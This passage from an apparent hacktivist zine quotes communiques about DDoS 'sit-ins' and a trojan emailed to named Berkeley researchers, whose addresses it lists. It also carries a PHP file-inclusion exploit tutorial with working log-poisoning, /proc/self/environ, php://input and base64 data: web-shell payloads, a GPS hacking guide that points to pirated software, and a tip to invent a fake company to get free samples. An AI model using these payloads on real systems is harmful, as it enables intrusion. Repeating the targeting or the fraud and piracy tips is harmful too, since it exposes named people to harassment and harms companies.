  15-year-old Anarchist, was murdered in cold blood by Greek Police. It is also
  the month that will forever be remembered by all those who struggle. Minutes
  after his murder, thousands of Greek residents took to the streets as did
  thousands around the world. Even liberal groups have called for the
  resignation of the Greek government. The streets were taken back for the
  people, police buildings were firebombed, and banks were turned into empty
  charred-out boxes. This entire time, the Greek government has been fighting
  and oppressing people with guns, tear gas, and the media. It's time that we
  take them down.""

  ""We will be attacking the websites of the Greek Police and the Prime Minister. 
  They are directly responsible and we will directly respond. They will no
  longer be able to spread their lies to the media about what is going on in the
  streets. You can either load the file on the day of the action or download it
  ahead of time. We suggest downloading it ahead of time in the event that our
  site get shut down.""

Hackers for Total Liberation launches campaign against Huntington Life Science
--------------------------------------------------------------------------------

A group calling itself Hackers for Total Liberation has started several actions 
against the notorious Huntington Life Science corporation which is guilty of 
torturing and abusing animals. Amongst their actions they have attempted to 
infect research computer systems within Berkeley with a destructive virus as 
well as launch an electronic sit-in against HLS websites. Here are some excerpts 
from the communiques they have released:

  ""Monday, January 26, you are invited to join us on an Electronic Sit In
  against HLS collaborators. We will be targeting the website of HLS's
  auditors RMSBG and since on the 26th it is the day of action against HLS
  customer, Bayer, we are targeting the website of one of their biggest
  products, aspirin.com.""

  ""UC Berkeley vivisector Ralph Freeman and all of the current lab members
  in Freeman's Visual Neuroscience Lab (http://neurovision.berkeley.edu)
  were sent a trojan horse virus embedded into email. This virus is
  designed to completely wreck their computers while leeching all vital
  personal information they've ever entered into their systems.""

  ""In addition to Freeman (freeman@neurovision.berkeley.edu), we sent the
  virus to Brian Pasley (bpasley@socrates.berkeley.edu), Thang Duong
  (thangd@uclink.berkeley.edu), Elena Allen (eadelle@uclink.berkeley.edu),
  Nina Yang (ninay@neurovision.berkeley.edu), Lars Eric Holm
  (larseric@neurovision.berkeley.edu), BaoWang Li
  (libaowang@neurovision.berkeley.edu), and Ahalya Viswanathan
  (ahalya_v@uclink.berkeley.edu)""

  ""It is time to buy new computers, and after that, save yourself the hassle
  that will follow and get the fuck out of this cat killing lab. The lab where
  kittens as young as six weeks live in daily fear and trauma from the violence
  that you are responsible for. The cats in stereotaxic devices with holes
  drilled into their skulls are what drives us and we will do anything to end
  your torture.""

  ""This action is dedicated to all those fighting for primate freedom at UCLA
  and all those who have taken action as of late against the animal murder
  industries in Central and South America. It is for the billions of animals
  currently enslaved.""

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
     we're not bitter ...   and neither is our coffee!  RNC 8 special blend

All proceeds go to the RNC 8. 1/2 lb bags of fair trade, medium roast, whole 
bean coffee available for $10 USD  (shipping included).  Place your order now by 
contacting ----- darkhartroastery@gmail.com -----
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

################################################################################
# 3. Hacking your GPS Personal Navigation Assistant                by KuroiShi #
################################################################################

DISCLAIMER: You can permanently break your GPS by doing this.   I haven't yet, 
but I'm sure it's possible.   I've heard of people bricking their GPS unit just 
by running 3rd party WinCE software on it.   Don't say you were not warned.

I recently got a PNA unit for my Chicago alley mapping project and learned some 
useful things about inexpensive touch screen devices on the market today.   
First off, most devices sold today are just locked down WinCE devices with low 
memory, no keyboard, GPS chipset and touchscreen.   Many include SD cards and 
USB interfaces and are easy to hack and install third party software on.   GPS 
hardware is cheap, and when you buy an expensive unit, your paying for the fancy 
navigation software and map updates it comes with.   Many of the expensive units 
run on the same hardware as ones you can pick up for $60-$80 bucks on sale.
I did all my work on the Holux GPSMile 52+, running WinCE 5.0.   From what I've 
gathered, it seems most PNA's these days run on the same or similar hardware.   
Mine uses a Samsung S3C2440A 400mhz ARM processor, with the SirfStar III GPS 
chipset, 32Mb NAND flash + 64Mb SDRAM internally, plus an SD slot for mapping 
software.   It has a 3.5"" (320x240 resolution) screen, which is important, 
because some of the software I run is made for 480x272, and you need to modify 
it so it fits on your screen.   GPS units similar to mine that might find this 
guide useful are:

Mio c310x, c320, c520, c710, c220, c620 and c720.
Magellan devices
Navigon devices
Pretty much anything with SirfStarIII, an ARM processor and Windows CE 4. or 5.0
As always, your mileage may vary.

Devices that WON'T unlock this way are:
TomTom devices
Garmin devices
(Both of these devices run a version of linux, and while i'd love to hack around 
with one of them, I don't have one!)

My GPS comes with a shitty little shell that launches on boot from the internal 
flash memory, it's called setup.exe, and I don't fuck with it because I think it 
launches some critical functions on boot.   If the SD card is inserted in the 
slot, it autoruns the GPS navigation software, called ""Holuxnavi.exe"", and if no 
SD card is present you just sit in the shell where you can select GPS, Pictures, 
Music, or change some rudimentary options.   It's easy enough to break out of 
this by naming whatever you want to run on boot to Holuxnavi.exe (or your 
respective auto-launching exe, for your device)   This brings us to;

Breaking out of your shell and into WindowsCE.

Now, I'm not sure why you'd want to use Windows CE over a functional and much 
prettier shell, but it does let you run software other than what your unit came 
with so lets get to it. You'll probably first want to replace your Holuxnavi.exe 
(or C310Auto.exe or whatever your GPS device starts at boot time, shouldn't be 
too difficult to find) with a basic winCE shell called ""ceDesktop.exe""   this 
will let you explore the files on your device and get a feel for things.   You 
can get ceDesktop and many other useful tools for this tutorial on 
gpspassion.com, gpsunderground.com and ppcwarez.org.   (these are forums, most 
of the software is hosted on rapidshare.com and similar sites.)   Now once you 
rename ceDesktop to replace your navigation software we can explore around a 
bit, see what minimal DLLs are required to run your device unmodded, etc.   Now 
would probably be a good time to backup your unit using Microsoft ActiveSync.   
I also recommend putting the SD card that comes with the unit in a safe place, 
and making a new one from the CD or SD card that came with your unit.   Now we 
should have access to the CE filesystem and a few basic things (like Control 
Panel)   Now we get to add some fun software.

Making your PNA environment more useful.

Now you have ceDesktop.exe running on boot, but theres still nothing but control 
panel and some shitty navigation software with maps from 2001.   I used some of 
the tools provided with the C310Auto.zip Mio C310 unlock package on 
GPSPassion.com to add some basic tools and get a regular desktop.   If you use 
this script you'll probably want to change the C310Auto.c31 script around, it 
makes some minor registry edits and copies some software to your internal 
memory.   Also, you need to change the .c31 file to reflect the name of your 
executable, (I.E. I rename my C310Auto.exe and .c31 to Holuxnavi.exe and 
Holuxnavi.c31 respectively, then I add a line in the .c31 script file to run 
ceDesktop after it does it's thing.)

C310Auto comes with some other stuff too, in the \SDMMC\Programs\Utils directory 
you'll find some useful tools for adding more software to your PNA.   It has a 
taskmanager (which I use to kill start.exe to drop to the CE desktop)   a 
Registry editor, On screen keyboard, a more fully featured filemanager than 
ceDesktop, and some status monitoring tools.   Surf around and find some more 
useful PocketPC apps to run and set up your environment any way you please.   
One thing you might want to do is make sure you do everything on the SD card and 
leave the internal memory on your unit alone as much as possible.   Another 
useful hint is to use Dependency Walker on a windows machine to open up your CE 
executables and check for DLL dependencies.   It's a pain in the ass in this 
minimal environment to get software running.

Installing 3rd party navigation software.

My unit came with Smart2Go which is some REALLY REALLY basic (read shitty) 
navigation software.   I never really tried using it for navigation, I've read 
about it telling people to take random turns off the street into buildings, 
random dangerous U-turns and just generally bad navigation and getting you lost.   
Plus the maps were so out of date that roads have been moved since it came out.   
I downloaded iGo 2008 off of Pirate Bay and used that to replace my navigation 
software.   Once again I had headaches finding all the DLLs I needed to make the 
installer run.   Dependency Walker was again, a life saver.   Some other popular 
software people run for navigation is MioMap, Finean, Destinator, PolNav, 
Route66, TomTom (Older versions, pre linux), Garmin (Same as TomTom, need to run 
older version)   I suggest you just try them out.   A good place to find this 
stuff is ppcwarez.org, gpsunderground.com, and thepiratebay.org.   
GPSPassion.com is an excellent resource for figuring out how to configure your 
unit, but they have taken a decidedly negative stance towards running pirated 
software on your GPS unit.   Also, if you find your unit crashing a lot during 
large file transfers and software installs, try turning up your virtual memory 
settings in the control panel.

Installing PDA software on your PNA.

Now hopefully everything has gone well and you have unlocked your WinCE, and 
installed some useful navigation software and some system tools.   Now what 
about playing DOOM and having contacts stored and a tip calculator and all that 
fun stuff?   I can't really recommend this software without saying first that 
I've read on forums of people using applications like this and it throwing off 
the touchscreen calibration to the point where the device is useless.   Again 
I'll repeat ""THIS CAN BRICK YOUR GPS DEVICE AND MAKE IT USELESS!""   The problems 
I have heard were with the GAPI graphics library crashing and then the 
touchscreen never works again.   I haven't had any problems, but you can't say I 
didn't warn you.     MioPocket is a suite of free software distributed online 
that turns your PNA into a PDA.   It was written for the Mio PNA's, but it runs 
fine on my Holux unit.   It has some useful shareware navigation software such 
as BeeLineGPS that I like for geocaching and for mapping my tracks in google 
maps. (For my aforementioned Chicago Alley Mapping Project)   MioPocket also has 
a bunch of shareware/freeware PDA software such as Microsoft Office document 
viewers, calculators, games, etc. etc.   It has a few skins, all pretty, if you 
think Vista is pretty.   MioPocket runs at 480x272 by default, so if you have a 
smaller unit like mine, you'll need to choose one of the 320x240 skins.   While 
it's pretty and fun to fuck around with, I don't trust MioPocket one bit, and 
only run it occasionally.   I built my own interface using some of the tools 
from the C310Auto package, some of the tools from MioPocket, and running a copy 
of iGo 8, It seems to run way more stable than MioPocket, and I don't have to 
worry about accidentally bricking my GPS with a crash.   MioPocket is hosted on 
Rapidshare, you can get a link to the latest version on the GPSPassion.com 
forums.

Useful resources.

I thought I'd just give you a run down of the resources I found most useful in 
hacking my GPS device.

GPSPassion.com - The most useful resource, GPS Enthusiasts from all over the 
world post useful information here.   They don't like discussion about running 
illegal software on your PNA.

gpsunderground.com - This site mostly just references to GPSPassion, but theres 
still some good info here, plus they aren't strict about talking about running 
pirated software.

ppcwarez.org - Links to pirated PocketPC software.   They have a whole GPS 
section with maps and nav software.

thepiratebay.org - Lots more current maps and nav software.   ppcwarez is 
missing a lot of US maps and such, plus rapidshare is a bitch.

dependencywalker.com - Find out what DLLs your CE software depends on. (Sorry, 
windows only.)

microsoft.com - ActiveSync for syncing files with your PNA.   Linux users can 
just use an SD card or theres several linux alternatives to ActiveSync.


################################################################################
# 4. Alternative PHP Include Vulnerability Techniques             by Anonymous #
################################################################################

One of the fundamental mistakes made by PHP developers is to improperly sanitize 
variables before being passed to system functions - particularly include() and 
require(). This common mistake leads to what is known as Remote File Include and 
Local File Include type vulnerabilities. In the past few years PHP itself has 
started to ship with default configuration settings to try to neutralize or 
limit the effects of such vulnerabilities. But even with simple local file 
includes, there are newer techniques to exploit these vulnerabilities that lead 
to remote command execution.

Introduction to PHP include vulnerabilities
--------
The point of file include type vulnerabilities is to figure out a way to include 
a file with your malicious PHP code in it. 

<?php   include($_GET['content']);   ?>
http://asdf/index.php?content=/etc/passwd
http://asdf/index.php?content=http://malicious.com/exec.php

The first example will include the local file /etc/passwd. The second example 
will attempt to retrieve exec.php from malicious.com. This remote include is 
turned off by the default allow_url_fopen PHP setting in most situations.

The vulnerable PHP code might be a little more restrictive than the above 
example. By prepending the include with a directory they prevent remote file 
includes(http://) and by appending a file extension they can attempt to restrict 
which types of files can be included. 

<?php include(""pages/"" . $_GET['content'] . "".php""); ?>
http://asdf/index.php?content=../../../etc/passwd%00

The use of ../ allow directory transversal style manipulations and lets you 
navigate outside of the prepended directory in the code. If the PHP setting 
open_basedir is on, it will prevent you from navigating around too much. The web 
developer might also use some sort of sanitation function to strip malicious 
characters out of user input, but this is not always the case.

The null byte character (%00 \0) terminates the string and cuts off whatever 
comes after it, but this is also escaped when magic_quotes_gpc is turned 
on(default). There are techniques published in the paper ""PHP filesystem attack 
vectors"" at http://ush.it that provide possible ways to get around sanitation of 
null byte characters.

The PHP script may also depend on such variables as $_GLOBAL[] or $_SERVER[] 
such as the recently discovered phplist vulnerability (patched in 2.10.9): 
http://asdf/phplist/admin/?_SERVER[ConfigFile]=/etc/passwd

Local File Include to Remote Code Execution
----
Once you find a local file include vulnerability, you need to find a way to 
insert your malicious PHP code into a file on the server. A number of techniques 
have appeared over the past few years:

One technique is to inject PHP code in server logs to be later included via the 
above include vulnerabilities. It is possible to make a HTTP request inserting 
our code into the headers and then including apache's access_log (It may take 
some experimentation to find the correct directory for access_log). Consider the 
following example which works on a Mac OS X default apache/php configuration 
(writing scripts to send requests may be necessary because the browser will 
escape certain characters) :

<?php  
$a = fsockopen(""localhost"", 80);
fwrite($a, 
""GET /<?php passthru(\$_GET['cmd']); ?> HTTP/1.1\r\n"" . 
""Host: localhost\r\n"" . 
""Connection: Close\r\n\r\n"" );
fclose($a);
?>

http://localhost/index.php?content=/var/log/httpd/access_log&cmd=id

Another method is including /proc/self/environ which contains the environment 
variables for the  apache/php process. If we were to insert malicious code into 
the User-Agent header, this code appears in that file, and so remote command 
execution is possible (provided /proc/self/environ is readable by the web 
server).

<?php  
$a = fsockopen(""localhost"", 80);
fwrite($a, 
""GET /../../../../proc/self/environ HTTP/1.1\r\n"" . 
""User-Agent: <?php passthru(\$_GET['cmd']); ?> \r\n"" . 
""Host: localhost\r\n"" . 
""Connection: Close\r\n\r\n"" );
fclose($a);
?>

PHP wrapper include vulnerabilities
--------
Another way of exploiting PHP include functions are utilizing php:// wrappers 
(http://www.php.net/wrappers.php). This example will utilize php://input which 
takes raw data from an HTTP POST request and executes it:

Vulnerable code:
<?php include($_GET['content']); ?>

Our request: 
<?php
$request = ""<?php passthru('id;');?> "";
$req = ""POST /index.php?content=php://input HTTP/1.1\r\n"" .
""Host: localhost\r\n"" .
""Content-type: text/html\r\n"" .
""Content-length: "" . strlen($request) . ""\r\n"" .
""Connection: Close\r\n\r\n"" .
""$request \r\n\r\n"";
$a = fsockopen(""10.0.2.2"", 80);
fwrite($a, $req);
echo $req;
while (!feof($a)) {  echo fgets($a, 128);  }
fclose($a); ?>

Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

This sample requires both allow_url_include and allow_fopen_include to be on, in 
which case the standard remote file inclusion (http://malicious/exec.txt) is 
possible. The advantage of this method is that it does not depend on storing 
files on external servers. cr0w-at.blogspot.com mentions another technique using 
the ""data:"" wrapper:

index.php?content=data:,<?php system($_GET[c]); ?>?&c=dir
   Or with base64 encryption (possibly bypassing validation/sketchy logs): 
index.php?content=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=dir

Conclusion
----
Most of these methods are nothing new and do not demonstrate flaws or 
limitations in the PHP language itself. These problems can typically be 
prevented by strong input validation, common sense coding, and some tighter 
server configurations. However it does not seem likely that many of these types 
of problems(among others, such as SQL injection) will be going away anytime 
soon. So Happy Hacking!


################################################################################
# 5. Hiding from the man: Apache IP Obfuscation                    by Flatline #
################################################################################

Recently I was considering the problem of keeping logs, obviously there are many 
reasons to keep apache logs on your server such as keeping stats, seeing who has 
been attack your website, and so on.  The problem with logs is that they can be 
a privacy hazard for your users if your server were to be seized, the police 
would be able to figure out who had been visiting your site.  I decided to come 
up with a solution to alleviate some of the privacy concerns, while still 
retaining the uniqueness of an ip address through a session so that useful 
webstats could still be gained.  What I came up with was the following script.

This script takes an ip adress and turns it into another ip address using a 
simple algorithm and the md5 hash.  This makes it so the ip addresses in your 
logs are not the users real ip addresses yet you will still be able to track the 
path a user takes through your site, since ip addresses will 
remain the same.

This script is not perfect of course, the main problem being that it is  
extremely vulnerable to a rainbow tables style attack.  The possible keyspace 
for IP's is only 255^4 leaving about 4 228 250 625 possibilities for ip's.  An 
attacker with enough time on their hands could quickly create a rainbow table 
for this script.  The problem would of course be alleviated by using ipv6 which 
has a keyspace of 3.4 * 10^38 ip addresses, making it nearly impossible for a 
rainbow tables style attack to work.  (Though by the time anyone adopts ipv6 
computing power will probably have significantly increased.)

Right now this script is only in a proof of concept stage, it lacks many 
fundamental features like error checking and the ability to parse log files, but 
if it works out I plan to make a full apache module for it.

#!/usr/bin/python
""""""
anonIP  -  Anonymize ip addresses in your logs while still mantaining ip address 
integrity
Author - flatline <flatline@hackbloc.org>
Copyright - GPLv3
Version = 0.1 (2009-03-14)

""""""
# This code was found on http://code.activestate.com/recipes/66517/
# The author is  Alex Martelli
import socket, struct, sys, md5
def dottedQuadToNum(ip):
  #turns an Ip address into a number, duh!
  ""convert decimal dotted quad string to long integer""
  return struct.unpack('!L',socket.inet_aton(ip))[0]

def numToDottedQuad(n):
  ""convert long int to dotted quad string""
  return socket.inet_ntoa(struct.pack('!L',n))
# Now starts my code

def ip2anonymous(ip):
  long = dottedQuadToNum(ip)
  m = md5.new(str(long)).hexdigest()
  newLong = int(m,16) % 4294967295 #This modulo is because socket.inet_aton 
  chokes on an int > 4294967295
  newip = numToDottedQuad(newLong)
  return newip

print ip2anonymous(sys.argv[1])


################################################################################
# 6. Sucking Signal                                                   by Sally #
################################################################################

Recently I had to set up a wifi network that is open to guest and volun¬teers at 
where I work and live. However, it needed to be set up outside the range that 
the omni antenna was already broadcasting. So what I did was purchase a 
directional antenna to ""suck"" the signal from the omni antenna and bring it 
through a bridged router and out through a regular router to the guest and 
volunteers further up the property. With the help of a couple of IT consultants 
and a Linksys router with DD-WRT firmware, this was made possible and I'll tell 
you how. 

EQUIPMENT 
•2.4 GHz 24 dBi High Performance Die Cast Reflector Grid Wireless LAN Antenna 
(Directional Antenna)
•HyperAmp® AP 1 Watt 2.4 GHz 802.11g (b/g) Compatible Outdoor Bi- Directional 
WiFi Amplifier with Active Power Control 
•N-Male to N-Male: 400-Series Cable 30 feet 
•N-Female to N-Female Bulkhead 0-6 GHz Lightning Surge Protector 
•N-Male to N-Male: 400-Series Cable 25 feet 
•N-Male to Reverse Polarity TNC Plug: 400-Series Cable 2 feet 
•2 Linksys WRT54GL v 1.1 routers – one acting as a bridge and the other acting 
as an AP.
Note: You don't have to use the equipment I used. There's cheaper stuff out 
there. 

SET UP 
So, with the help of a co-worker and friend, we got the directional antenna on 
the roof mounted next to a fan, but far enough so the fan did not mess with 
reception. We then connected the amp to the antenna just a foot under the 
antenna on the same pole. Then we took the 30 foot n-male to n-male 400 series 
cable and connected it to the lightning protector. We put the lightning 
protector in a weather proof box and attached it to the roof. A 20 foot cooper 
wire was connected to the top of the lightning protector and then run down to 
the ground where it was attached to a ground stake and pounded into the ground 
(we have a lot of rain and thunder here, so that was needed). The 25 foot n-male 
to n-male cable was connected to other end of the lightning protector and run to 
the power injector (which comes with the amp) and is located indoors next to the 
routers. The n-male to tnc 2 foot cable was run from the power injector to the 
Linksys router that we used as a bridge.  It went where one of the short rubber 
duck antennas was located. The other Linksys WRT54G router became an Access 
Point (AP) and was connected to the bridge via a cat 5e cable.  One end of a cat 
5e cable was connected to the internet (WAN) port of the AP and the other end 
was connected to port 1 of the bridge.


FLASH FIRMWARE 

The following explains how to wipe the Linksys firmware on a router and replace 
it with DD-WRT.  For this article, you only have to flash the firmware for the 
router that will be the bridge because the Linksys firmware does not have bridge 
capabilities.

Note 1: If not followed properly, your router can be bricked. Linksys won't 
provide support when you install 3rd party firmware. We are not responsible for 
a bricked router. Do this at your own risk. 

Note 2: Do this over a wired connection. 

Note 3: Backup the router's CFE before flashing the firmware 
(http://www.dd-wrt.com/wiki/index.php/CFE_backup).  That way you can replace 
your CFE should a brick occur.

1.	Hard Reset: 30-30-30
	a.	Plug in the router.
	b.	Push in the reset button with a pen.
	c.	Hold it for 30 seconds.
	d.	Don't let go and pull the power cord out for 30 seconds.
	e.	Put the power cord back in for 30 seconds.
2.	Wait. 
3.	Flash firmware. 
	a.	Open a browser and go to 192.168.1.1.
	b.	User=Admin and Password=Admin.
	c.	Go to the Administration tab. 
	d.	Then go to Firmware Upgrade subtab.
	e.	Go here to find the proper firmware for the router you are using.
		http://www.dd-wrt.com/wiki/index.php/Supported_Devices#Linksys_.
		28all_the_rest_that_is_not_re-engineered_til_today.29
			1.	The last column tells you what to use.
	f.	Use the latest build.  ftp://dd-wrt.com/others/eko/V24_TNG/svn11296/
		i.	Version 24 service pack 2 svn11296 seems the most stable.
		ii.	For this article we downloaded dd-wrt.v24-11296_NEWD_mini.bin
	g.	Browse to the location you downloaded the firmware.
		i.	Click upgrade. 
4.	Wait.5 minutes. 
	a.	Lights should return to normal.
	b.	Failing to wait is how most people brick their routers. 
5.	Do a power cycle of the router. 
	a.	Unplug the power cord, count to 30 and plug it back in.
6.	Wait for the lights to return to normal, usually about 2 minutes. 
7.	HARD reset again (see #1 above).
	a.	Wait. 
	b.	Check for the password page and re-login to change the password. 
	c.	Then you can reconfigure your settings manually.

Things not to do!
1.	Don't install old config files on newer firmware upgrades.
2.	Don't unplug or reset while firmware is upgrading.
3.	Don't use v24 sp1.

Which version of firmware to use:
The final version of 24 (currently SP2):  SVN11296 seems very stable.
1.	WRT54G v2 vintage (vint) firmware.
2.	WRT54G v5 newd micro.
3.	WRT54G v8 v24 micro
4.	WRT54GL newd mini when first flashing, then newd std.

Troubleshooting 
•	On a WinXP OS use IE explorer instead of Firefox or clear the cache on 
Firefox if it seems that changes aren't saving. 
•	Use http not https when browsing to the IP addresses. 

CREATE BRIDGE 
I went to DD-WRT wiki and found out how to create a bridge using the DD-WRT 
firmware on the Linksys router 
(http://www.dd-wrt.com/wiki/index.php/Wireless_Bridge). This is how it worked 
for me: 

1.	Currently, your router should be  IP is 192.168.1.1 from reseting it.
2.	Log into the DD-WRT router. 
	a.	User: root and pass: admin.
	b. 	Otherwise, you might be asked to set the username and password. 
4.	Go to the Setup Tab > Basic Setup 
	a.	Connection Type: Disable 
	b.	STP: Disable 
	c.	Set Local IP: 192.168.2.2. 
		i)	This IP address is for the bridge.
		ii)	You can make it whatever IP address you want, but it must be in the 
		subnet of the gateway IP address.
	d. 	Gateway: 192.168.2.1
		i)	This was the IP address of the broadcasting network we were trying 
		to bridge.
		2)	In our case it was our Guest network that the omni was broadcasting.
	d. 	DNS: 192.168.2.1	
	e.	Assign WAN Port To Switch: Checked 
	f.	DHCP Server: Disable 
	g.	Click ""Save Settings"".
	h.	Click ""Apply"" — triggers reboot.
5.	Give your computer a static IP address within the 192.168.2.X subnet.	
	a.	The gateway is the IP address of the bridge: 192.168.2.2.
	b.	Log back on to 192.168.2.2. 
5.	Go to the Security Tab > Firewall 
	a.	SPI Firewall: Disable 
	b.	Click ""Save Settings"" 
6.	Go to the Wireless Tab > Basic Settings 
	a.	Wireless Mode: Client Bridge 
	b.	Wireless Network Mode: Match your primary router. 
	c.	Wireless Network Name (SSID): Match your primary router. (case matters!) 
	d.	Wireless Channel is not relevant in Client Bridge mode. 
	e.	Click ""Save Settings"". 
		The router will now be in Client Bridge mode. 
7.	Wireless Tab > Wireless Security 
	a.	(Go to this link http://www.dd-wrt.com/wiki/index.php/Wireless_Bridge  
    	for more info).
		i)	We don't use a WEP. 
8.	Go to the Status Tab > Wireless 
	a.	Click Site Survey and join the appropriate wireless network. 
		i)	The Access Point table should show the MAC address of your Primary 
		Router, along with signal strength. 
		ii)	SSID Broadcast MUST be enabled on the routing your are sucking 
		signal from.
9.	Go to the Administration Tab > Backup 
		a) Click ""Backup."" 

We ended up buying the exact same equipment above and attaching it to the AP.  
The only difference is that we purchased an omni antenna 2.4GHz 15dBi instead of 
a directional.  The omni was put 4 feet above the directional antenna on the 
same pole.

SET UP ACCESS POINT
1.	Set your computers IP address to DHCP.
2.	Log onto the other Linksys WRT54GL that was not used as the bridge.
	a.	192.168.1.1 assuming it's new or it's been reset. 
	b.	User: admin pass: admin. 
3.	Go to the Setup Tab > Basic Setup 
	a.	Internet setup: Automatic Configuration – DHCP 
	b.	Network setup 
		i)	Router IP: 192.168.3.1 
			(1)	This was done so as not to conflict with the IP addresses that 
			were given out at via DHCP on 192.168.2.1 
		ii)	Network address 
			(1)	DHCP Server: Enable. 
		iii)	Time Setting: (Which ever time zone you are in). 
	c.	Save settings. 
4.	Release and renew the IP address of your computer.
5.	Go to the Setup Tab > Advanced Routing. 
	a.	Operating Mode: Gateway. 
6.	Go to the Wireless Tab > Basic Wireless Settings 
	a.	Wireless Network Mode: Mixed. 
	b.	Wireless Network Name (SSID): (your ssid here) 
	c.	Wireless Channel: 1 
		i)	Channels 1, 6 and 11 are the best and non-overlapping. 
		ii)	We choose 1 because 6 and 11 were already in use and we did not want 
		interference. 
	d.	Wireless SSID Broadcast: Enable. 
	e.	Save settings. 
7.	Go to the Status Tab > Router 
	a.	The AP's IP Address shows that it's getting a DHCP'd IP from the network 
	we're sucking from: 192.168.2.1. 
	b.	The Gateway and DNS are from 192.168.2.1. 
8.	Go to the Status Tab > Local Network 
	a.	Shows the 192.168.3.1 network and the DHCP server info. 
9.	Status Tab > Wireless 
	a.	Shows SSID, mode and channel info. 

Now you're ready to suck signal!


################################################################################
# 7. Hardware Hacking                                                by Frenzy #
################################################################################

Hardware hacking, another tool in the tool box, but essential for those of us 
who want to learn the system. Hardware hacking and circuit building can be very 
rewarding with not much effort. With a resent surge in interest in ""hobby 
electronics"" there are LOTS of resources out there. There are also people trying 
to make a buck, and looking to make you spend more than you need to. This 
article seeks to display some of the ways I have found to get parts for free or 
cheap!

The first thing a hardware hacker needs is tools starting with a good soldering 
iron. For this, it's best to get one that is a of good quality and a fine tip. A 
fat tip will just get in the way. My first soldering iron was a radio shack one, 
it worked, but once I upgraded to a xytronics one, my life got easier. You can 
pick up either a weller or xytronics iron, the xytronics ones are cheaper, a 
good one is under 30 bucks. The best way I have found to get this is on line. Do 
some research. Along with an iron you'll need a multimeter, wire strippers, wire 
cutters and a lead cutter to trim components. Some way to remove solder helps as 
well, like a ""solder sucker"" or de-soldering wick. Once you have your tools 
together it's time to go dumpster diving.

Dumpster diving is a good way to find lots of various components. I have found 
enough random capacitors and LEDs on spare circuit boards do projects without 
spending a dime. Removing parts from old circuit boards is also a good way to 
practice soldering. I dumpster behind the local radio shack and trolled around 
the local college campus. Bring a screwdriver with you so you can open things on 
the road and leave behind the cases taking with you the precious goodies! I use 
almost everything from the wire, to speakers and resistors. If you are good with 
a heat gun, you can use that to do your de-soldering and have all the parts fall 
right out!

The next way to get cheap parts is Ebay. Once you know what you need, go on Ebay 
and search for it. A lot of the sellers are direct from china (you get the parts 
from china anyway you might as well get them direct), so they are a lot cheaper, 
and sellers like to throw in goodies. I ordered 100 LEDs and got 100 resistors 
for free.

Requesting samples can work with a few companies. I have successfully requested 
samples from Texas Instruments and Pactec enclosures. The key to getting samples 
is how believable you are. Make up a fake company, and try it out. It's nice to 
get free things sent to your door. I'm sure if you were really advanced, you 
could never by parts again. For more about this go to 
http://www.ladyada.net/library/procure/index.html.

Lastly, ask your friends. You may have friends who tried out the hardware 
hacking thing and it wasn't for them. Parts have not changed much in the past 20 
years, so many will still work. If you have lots of friends into hardware, you 
can go to a large distributor like DigiKey and get an order of parts.

HAPPY HARDWARE HACKING!

Here are a list of resources for those getting into hardware hacking:
Make: Magazine: www.makezine.com
Ladyada: http://www.ladyada.net/
Instructables: www.instructables.com


################################################################################
# 8. On Using Technology to Dismantle the Industrial Beast        by Anonymous #
################################################################################

Our civilization is so flooded with technology that it is difficult to imagine a 
world without it. We have machines to wake us up and make us coffee in the 
morning, machines to keep us informed and entertained, and machines to clean and 
dry our clothes. Many people who work exclusively with computers and technology 
cannot accomplish these simple tasks without the use of machines.

Yet human beings on this planet have been able to survive in harmony for 
hundreds of thousands of years without many of these 'modern advances'. The 
majority of these domestications have only happened in the past few hundred 
years with the Industrial Revolution. Now, not by coincidence, we are facing our 
largest problems ever: with the resources and space available, will we really be 
able to sustain this great Industrial Beast we've built without killing 
ourselves? And if we can, would it really be worth it?

The arguments for technology and industrialism usually suggest that these 
""advances"" make life easier, work more efficient, and more enjoyable. As far as 
survival is concerned, we only really need a few basic needs, which in our 
natural environment are relatively easy to procure as hunter / gatherers. Now 
this is only possible in areas outside of cities where the land is not ""owned' 
and the food is not under lock and key. In these places, it becomes necessary to 
participate in the Economy by working at one of their jobs, the majority of 
which are not productive for survival purposes, but are artificially necessary 
to support the Industrial Beast. This ends up creating more work than is 
actually necessary for our survival, all for the Corporate Executives and 
Stockholders who profit from our labor. Additionally, our reliance on technology 
can make it difficult for some to prepare food, make or repair clothing, or even 
keep entertained and stimulated without the aid of technology. 

Technology and Industrialism are not necessary for our survival, and in fact, 
are being used against humanity and the planet as a whole by those who are 
currently in control of it: the Rich Ruling Classes.

At one point it was possible to disappear easily and live Off The Grid. Now, 
with the help of modern technological advances, the ruling classes' dream can be 
fully realized: a world where everyone is given numbers and are carefully 
tracked, monitored, regimented. Virtually every aspect of our lives are now 
under surveillance through integrated camera systems, GPS locating devices, RFID 
tags, social security numbers & bank accounts, phone / email taps, and even 
urine tests. On suspicion of wrongdoing, they can detain us and deny us our 
rights, calling us terrorists. Yet every day we are the ones who are Terrorized 
by their Technological Police State, exceeding Orwell's wildest nightmares.

Technology is also being used to keep us passive, domesticated, and brainwashed 
by the machine's propaganda. A few corporations control most of the television 
stations, radio stations, newspapers and other media. They use their monopoly of 
the media to broadcast the positions of the State, favorable to Corporate and 
Government interests. They keep us passive and sedated with mindless 
entertainment, video games, reality TV shows, making us confused, distracted, 
numb, and 'comfortable'. Now much of our communication with other human beings 
has been reduced to instant messages and blogs. We have become their zombies who 
cannot think or accomplish this for ourselves or survive on our own, to a point 
where we depend on the Industrial Beast and cannot live without it - just where 
they want us.

In addition to keeping us in slavery, the Machine has also held captive and is 
endangering the planet's stability. There is not much land and space that has 
not been encroached by the Industrial Beast. Entire species have either been 
wiped out, domesticated, or controlled for food. Humans are the only species 
that believes the entire planet belongs to it, and can be terraformed for 
humanity. It does not take much research to see how badly we have damages the 
earth's natural balance, covering the earth with parking lots, power plants, 
Starbucks and concrete jungles. Exhausting the earth's natural resources, 
climate instability, endangered species, even the air's breatheability and the 
water's drinkability, all of which are a direct result of the Industrial Beast 
and the expansion of Capitalism.

In summary, the madness of the machine as controlled by the Rich Ruling Classes 
is keeping us in chains. All this time we have been seduced and bamboozled by 
their promised life of luxury and freedom through their technology, and all we 
have is a world spinning towards extinction so that a few corporate executives 
can profit. We are facing a global crisis, and the problem lies deeper than 
